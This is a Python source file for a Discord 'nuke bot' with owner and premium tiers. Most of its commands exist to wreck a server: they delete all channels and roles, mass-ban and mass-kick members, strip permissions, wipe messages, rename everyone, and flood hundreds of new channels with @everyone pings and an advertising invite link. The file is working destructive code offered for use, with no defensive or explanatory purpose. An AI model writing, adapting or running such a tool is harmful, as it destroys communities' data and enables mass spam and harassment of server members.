import discord
from discord.ext import commands
import json
import os
import sys
from datetime import datetime
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Intents
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Owner ID
OWNER_ID = 1390807168126554234
OWNER_NAME = "abhinav_obito_"
SUPPORT_SERVER = "https://discord.gg/ECct82TmCg"
DATA_FILE = 'bot_data.json'
SPAM_MESSAGE = "https://discord.gg/ECct82TmCg"

# Get token from .env
TOKEN = os.getenv('TOKEN')
if not TOKEN:
    print("❌ ERROR: TOKEN not found in .env file!")
    sys.exit(1)

# Load/Save data
def load_data():
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        print(f"Error loading data: {e}")
    
    return {
        'premium_users': [], 
        'owner_id': OWNER_ID, 
        'blocklist_users': [], 
        'blocklist_servers': []
    }

def save_data(data):
    try:
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"Error saving data: {e}")

data = load_data()

@bot.event
async def on_ready():
    print(f'✅ Bot logged in as {bot.user}')
    print(f'🤖 Bot is ready!')
    try:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="!help"))
    except Exception as e:
        print(f"Error setting presence: {e}")

# Owner Check
def is_owner(ctx):
    return ctx.author.id == data['owner_id']

# Premium Check
def is_premium(user_id):
    return user_id in data['premium_users']

# Blocklist Check
def is_blocked_user(user_id):
    return user_id in data['blocklist_users']

def is_blocked_server(server_id):
    return server_id in data['blocklist_servers']

# ============= BLOCKLIST COMMANDS (OWNER ONLY) =============

@bot.command(name='blockuser')
async def block_user(ctx, user: discord.User):
    """Block a user from using the bot (Owner only)"""
    if not is_owner(ctx):
        await ctx.send("❌ You're not the owner!")
        return
    
    if user.id in data['blocklist_users']:
        await ctx.send(f"⚠️ {user.mention} is already blocked!")
        return
    
    if user.id == OWNER_ID:
        await ctx.send("❌ You can't block the owner!")
        return
    
    data['blocklist_users'].append(user.id)
    save_data(data)
    embed = discord.Embed(title="🚫 User Blocked", color=discord.Color.red())
    embed.add_field(name="Blocked User", value=f"{user.mention} (`{user.id}`)", inline=False)
    embed.add_field(name="Blocked By", value=f"{ctx.author.mention}", inline=False)
    await ctx.send(embed=embed)

@bot.command(name='unblockuser')
async def unblock_user(ctx, user: discord.User):
    """Unblock a user from using the bot (Owner only)"""
    if not is_owner(ctx):
        await ctx.send("❌ You're not the owner!")
        return
    
    if user.id not in data['blocklist_users']:
        await ctx.send(f"⚠️ {user.mention} is not blocked!")
        return
    
    data['blocklist_users'].remove(user.id)
    save_data(data)
    embed = discord.Embed(title="✅ User Unblocked", color=discord.Color.green())
    embed.add_field(name="Unblocked User", value=f"{user.mention} (`{user.id}`)", inline=False)
    embed.add_field(name="Unblocked By", value=f"{ctx.author.mention}", inline=False)
    await ctx.send(embed=embed)

@bot.command(name='blockserver')
async def block_server(ctx, server_id: int):
    """Block a server from using the bot (Owner only)"""
    if not is_owner(ctx):
        await ctx.send("❌ You're not the owner!")
        return
    
    if server_id in data['blocklist_servers']:
        await ctx.send(f"⚠️ Server `{server_id}` is already blocked!")
        return
    
    data['blocklist_servers'].append(server_id)
    save_data(data)
    embed = discord.Embed(title="🚫 Server Blocked", color=discord.Color.red())
    embed.add_field(name="Blocked Server ID", value=f"`{server_id}`", inline=False)
    embed.add_field(name="Blocked By", value=f"{ctx.author.mention}", inline=False)
    await ctx.send(embed=embed)

@bot.command(name='unblockserver')
async def unblock_server(ctx, server_id: int):
    """Unblock a server from using the bot (Owner only)"""
    if not is_owner(ctx):
        await ctx.send("❌ You're not the owner!")
        return
    
    if server_id not in data['blocklist_servers']:
        await ctx.send(f"⚠️ Server `{server_id}` is not blocked!")
        return
    
    data['blocklist_servers'].remove(server_id)
    save_data(data)
    embed = discord.Embed(title="✅ Server Unblocked", color=discord.Color.green())
    embed.add_field(name="Unblocked Server ID", value=f"`{server_id}`", inline=False)
    embed.add_field(name="Unblocked By", value=f"{ctx.author.mention}", inline=False)
    await ctx.send(embed=embed)

@bot.command(name='blocklist')
async def blocklist_cmd(ctx):
    """View all blocked users and servers (Owner only)"""
    if not is_owner(ctx):
        await ctx.send("❌ You're not the owner!")
        return
    
    embed = discord.Embed(title="📋 Blocklist", color=discord.Color.orange())
    
    if data['blocklist_users']:
        blocked_users = "\n".join([f"`{user_id}`" for user_id in data['blocklist_users']])
        embed.add_field(name=f"🚫 Blocked Users ({len(data['blocklist_users'])})", value=blocked_users, inline=False)
    else:
        embed.add_field(name="🚫 Blocked Users", value="No blocked users", inline=False)
    
    if data['blocklist_servers']:
        blocked_servers = "\n".join([f"`{server_id}`" for server_id in data['blocklist_servers']])
        embed.add_field(name=f"🚫 Blocked Servers ({len(data['blocklist_servers'])})", value=blocked_servers, inline=False)
    else:
        embed.add_field(name="🚫 Blocked Servers", value="No blocked servers", inline=False)
    
    embed.set_footer(text=f"Total Blocked: {len(data['blocklist_users']) + len(data['blocklist_servers'])}")
    await ctx.send(embed=embed)

# ============= OWNER COMMANDS =============

@bot.command(name='addpremium')
async def add_premium(ctx, user: discord.User):
    """Add premium to a user (Owner only)"""
    if not is_owner(ctx):
        await ctx.send("❌ You're not the owner!")
        return
    
    if user.id in data['premium_users']:
        await ctx.send(f"⚠️ {user.mention} already has premium!")
        return
    
    data['premium_users'].append(user.id)
    save_data(data)
    await ctx.send(f"✅ {user.mention} now has premium access!")

@bot.command(name='removepremium')
async def remove_premium(ctx, user: discord.User):
    """Remove premium from a user (Owner only)"""
    if not is_owner(ctx):
        await ctx.send("❌ You're not the owner!")
        return
    
    if user.id not in data['premium_users']:
        await ctx.send(f"⚠️ {user.mention} doesn't have premium!")
        return
    
    data['premium_users'].remove(user.id)
    save_data(data)
    await ctx.send(f"✅ Premium removed from {user.mention}!")

@bot.command(name='setownerid')
async def set_owner_id(ctx, owner_id: int):
    """Set new owner ID (Owner only)"""
    if not is_owner(ctx):
        await ctx.send("❌ You're not the owner!")
        return
    
    data['owner_id'] = owner_id
    save_data(data)
    await ctx.send(f"✅ Owner ID changed to `{owner_id}`!")

# ============= BLOCKLIST CHECK ON COMMAND USE =============

@bot.before_invoke
async def before_any_command(ctx):
    """Check if user or server is blocked before executing any command"""
    try:
        if ctx.author.id == data['owner_id']:
            return
        
        if is_blocked_user(ctx.author.id):
            embed = discord.Embed(title="🚫 Access Denied", description="You are blocked from using this bot!", color=discord.Color.red())
            embed.add_field(name="Reason", value="Your account has been blocked by the owner", inline=False)
            embed.add_field(name="Support", value=f"[Click here]({SUPPORT_SERVER})", inline=False)
            await ctx.send(embed=embed)
            raise commands.CommandError("User is blocked")
        
        if is_blocked_server(ctx.guild.id):
            embed = discord.Embed(title="🚫 Access Denied", description="This server is blocked from using this bot!", color=discord.Color.red())
            embed.add_field(name="Reason", value="Your server has been blocked by the owner", inline=False)
            embed.add_field(name="Support", value=f"[Click here]({SUPPORT_SERVER})", inline=False)
            await ctx.send(embed=embed)
            raise commands.CommandError("Server is blocked")
    except commands.CommandError:
        raise
    except Exception as e:
        print(f"Error in before_invoke: {e}")

# ============= PREMIUM COMMANDS =============

@bot.command(name='nuke')
async def nuke(ctx, channels: int = 50, channel_name: str = None, *, message: str = None):
    """Nuke the entire server with custom channel count (50-500) with @everyone pings (Premium only)"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium to use this command!")
        return
    
    if channels < 50 or channels > 500:
        await ctx.send("❌ Channel count must be between 50 and 500!")
        return
    
    if not channel_name:
        channel_name = "navynuker💀"
    if not message:
        message = "🚀 SERVER HAS BEEN NUKED! 🚀"
    
    try:
        print(f"🚀 NUKE INITIATED - Creating {channels} channels!")
        
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                pass
        
        for role in list(ctx.guild.roles):
            try:
                if role.name != "@everyone":
                    await role.delete()
            except:
                pass
        
        for i in range(channels):
            try:
                nuke_channel_name = f"{channel_name}-{i+1}"
                new_channel = await ctx.guild.create_text_channel(nuke_channel_name)
                
                for j in range(40):
                    await new_channel.send(f"@everyone\n```\n{message}\n```\n@everyone {SPAM_MESSAGE}")
                
                if (i + 1) % 50 == 0:
                    print(f"✅ Created & spammed {i+1}/{channels} channels")
            except Exception as e:
                print(f"❌ Error creating channel: {str(e)}")
        
        print(f"🎉 NUKE COMPLETE!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")
        print(f"❌ Error: {str(e)}")

@bot.command(name='autonuke')
async def auto_nuke(ctx):
    """Auto nuke - Delete all channels, create 50 NAVYNUKER💀 channels with 40x spam"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium to use this command!")
        return
    
    try:
        print(f"🚀 AUTONUKE INITIATED")
        
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                pass
        
        for role in list(ctx.guild.roles):
            try:
                if role.name != "@everyone":
                    await role.delete()
            except:
                pass
        
        for i in range(50):
            try:
                channel_name = f"navynuker💀-{i+1}"
                new_channel = await ctx.guild.create_text_channel(channel_name)
                
                for j in range(40):
                    await new_channel.send(f"@everyone {SPAM_MESSAGE}")
                
                if (i + 1) % 50 == 0:
                    print(f"✅ Created & spammed {i+1}/50 channels")
            except Exception as e:
                print(f"❌ Error: {str(e)}")
        
        print(f"🎉 AUTONUKE COMPLETE!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='servername')
async def change_server_name(ctx, *, new_name: str):
    """Change server name (Premium only)"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium to use this command!")
        return
    
    try:
        await ctx.guild.edit(name=new_name)
        await ctx.send(f"✅ Server name changed!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='spamchannel')
async def spam_channel(ctx, channel_name: str, *, custom_message: str = None):
    """Create a channel and spam 40 messages with @everyone ping (Premium only)"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium to use this command!")
        return
    
    if not custom_message:
        custom_message = SPAM_MESSAGE
    
    try:
        channel = await ctx.guild.create_text_channel(channel_name)
        for i in range(40):
            await channel.send(f"@everyone {custom_message}")
        await ctx.send(f"✅ Created channel with spam!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='deletechannels')
async def delete_channels(ctx):
    """Delete all channels (Premium only)"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium to use this command!")
        return
    
    try:
        count = 0
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                count += 1
            except:
                pass
        await ctx.send(f"✅ Deleted {count} channels!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='deleteroles')
async def delete_roles(ctx):
    """Delete all roles (Premium only)"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium to use this command!")
        return
    
    try:
        count = 0
        for role in list(ctx.guild.roles):
            try:
                if role.name != "@everyone":
                    await role.delete()
                    count += 1
            except:
                pass
        await ctx.send(f"✅ Deleted {count} roles!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='massban')
async def mass_ban(ctx):
    """Ban all members in the server (Premium only)"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium to use this command!")
        return
    
    try:
        count = 0
        for member in list(ctx.guild.members):
            try:
                if member.id != bot.user.id and member.id != ctx.author.id:
                    await member.ban()
                    count += 1
            except:
                pass
        await ctx.send(f"✅ Banned {count} members!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='masskick')
async def mass_kick(ctx):
    """Kick all members from the server (Premium only)"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium to use this command!")
        return
    
    try:
        count = 0
        for member in list(ctx.guild.members):
            try:
                if member.id != bot.user.id and member.id != ctx.author.id:
                    await member.kick()
                    count += 1
            except:
                pass
        await ctx.send(f"✅ Kicked {count} members!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='spam')
async def spam(ctx, times: int = 10, *, message: str = None):
    """Spam @everyone X times in current channel (Premium only)"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium to use this command!")
        return
    
    if times > 100:
        await ctx.send("❌ Maximum 100!")
        return
    
    if not message:
        message = SPAM_MESSAGE
    
    try:
        for i in range(times):
            await ctx.send(f"@everyone {message}")
        await ctx.send(f"✅ Spammed!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='createvoice')
async def create_voice(ctx, count: int = 50):
    """Create X voice channels (Premium only)"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium!")
        return
    
    if count > 500:
        await ctx.send("❌ Max 500!")
        return
    
    try:
        for i in range(count):
            try:
                await ctx.guild.create_voice_channel(f"navynuker💀-{i+1}")
            except:
                pass
        await ctx.send(f"✅ Created {count} channels!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='changeroles')
async def change_roles(ctx):
    """Change all roles to @everyone permissions (Premium only)"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium!")
        return
    
    try:
        count = 0
        for role in list(ctx.guild.roles):
            try:
                if role.name != "@everyone":
                    await role.edit(permissions=discord.Permissions.none())
                    count += 1
            except:
                pass
        await ctx.send(f"✅ Modified {count} roles!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='messagedelete')
async def message_delete(ctx):
    """Delete all messages in current channel (Premium only)"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium!")
        return
    
    try:
        count = 0
        async for message in ctx.channel.history(limit=100):
            try:
                await message.delete()
                count += 1
            except:
                pass
        await ctx.send(f"✅ Deleted {count} messages!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='nickspam')
async def nick_spam(ctx, *, nickname: str = "NUKED"):
    """Change all member nicknames (Premium only)"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium!")
        return
    
    try:
        count = 0
        for member in list(ctx.guild.members):
            try:
                if member.id != bot.user.id:
                    await member.edit(nick=nickname)
                    count += 1
            except:
                pass
        await ctx.send(f"✅ Changed {count} nicks!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='rolemention')
async def role_mention(ctx, times: int = 10):
    """Create role and mention it X times (Premium only)"""
    if not is_owner(ctx) and not is_premium(ctx.author.id):
        await ctx.send("❌ You need premium!")
        return
    
    if times > 100:
        await ctx.send("❌ Max 100!")
        return
    
    try:
        role = await ctx.guild.create_role(name="NAVYNUKER💀", mentionable=True)
        for i in range(times):
            await ctx.send(f"{role.mention} {SPAM_MESSAGE}")
        await ctx.send(f"✅ Created role!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ============= UTILITY COMMANDS =============

@bot.command(name='help')
async def help_command(ctx):
    """Show all commands"""
    is_owner_status = is_owner(ctx)
    is_premium_status = is_premium(ctx.author.id)
    
    embed = discord.Embed(title="🤖 Nuke Bot - Help", color=discord.Color.red())
    
    embed.add_field(name="ℹ️ Info", value=
        f"Owner: {OWNER_NAME}\n"
        f"Status: {'✅ Premium' if is_premium_status else '❌ No Premium'}\n"
        f"Role: {'Owner' if is_owner_status else 'User'}",
        inline=False)
    
    if is_owner_status:
        embed.add_field(name="👑 Owner Commands", value=
            "`!addpremium @user`\n"
            "`!removepremium @user`\n"
            "`!blockuser @user`\n"
            "`!blocklist`",
            inline=False)
    
    if is_premium_status or is_owner_status:
        embed.add_field(name="💎 Premium Commands", value=
            "`!nuke [count]` `!autonuke` `!spam`\n"
            "`!massban` `!masskick` `!deletechannels`\n"
            "`!createvoice` `!spamchannel`",
            inline=False)
    
    await ctx.send(embed=embed)

@bot.command(name='status')
async def status_cmd(ctx):
    """Your status"""
    embed = discord.Embed(title=f"Status - {ctx.author.name}", color=discord.Color.green())
    embed.add_field(name="Premium", value="✅ YES" if is_premium(ctx.author.id) else "❌ NO", inline=True)
    embed.add_field(name="Owner", value="✅ YES" if is_owner(ctx) else "❌ NO", inline=True)
    await ctx.send(embed=embed)

class SupportButtons(discord.ui.View):
    def __init__(self):
        super().__init__()
    
    @discord.ui.button(label="Support Server", style=discord.ButtonStyle.link, url=SUPPORT_SERVER, emoji="🔗")
    async def support_link(self, interaction: discord.Interaction, button: discord.ui.Button):
        pass

@bot.command(name='support')
async def support(ctx):
    """Get support"""
    embed = discord.Embed(title="🆘 Support", description=f"Owner: {OWNER_NAME}", color=discord.Color.blue())
    embed.add_field(name="Support Server", value=f"[Join]({SUPPORT_SERVER})", inline=False)
    await ctx.send(embed=embed, view=SupportButtons())

# Error handling
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing argument: {error.param}")
    elif isinstance(error, commands.BadArgument):
        await ctx.send(f"❌ Bad argument: {error}")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        print(f"Error: {error}")

# Run bot
if __name__ == '__main__':
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"❌ Error running bot: {e}")
        sys.exit(1)